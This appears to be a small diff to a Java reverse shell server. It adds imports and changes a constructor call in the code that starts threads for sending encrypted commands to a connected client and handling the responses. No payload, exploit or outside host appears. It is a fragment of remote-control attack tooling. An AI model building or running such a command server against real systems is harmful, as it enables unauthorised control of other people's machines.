@@ -1,5 +1,8 @@
 package obs1d1anc1ph3r.reverseshell.server;
 
+import obs1d1anc1ph3r.reverseshell.server.utils.ServerSetup;
+import obs1d1anc1ph3r.reverseshell.server.responsehandling.ResponseHandler;
+import obs1d1anc1ph3r.reverseshell.server.commandhandling.CommandSender;
 import java.io.*;
 import java.net.*;
 import java.util.logging.*;
@@ -40,7 +43,7 @@ public class ReverseShellServer {
 			outputReceiver = new Thread(new ResponseHandler(dataIn, dataOut, clientSocket, encryptionKey)); //Handle those responses
 			outputReceiver.start();
 
-			inputHandler = new Thread(new CommandSender(dataOut, userInput, this, encryptionKey, nonce)); //Send those commands like a dom
+			inputHandler = new Thread(new CommandSender(dataOut, userInput, encryptionKey, nonce)); //Send those commands like a dom
 			inputHandler.start();
 
 		} catch (IOException e) {
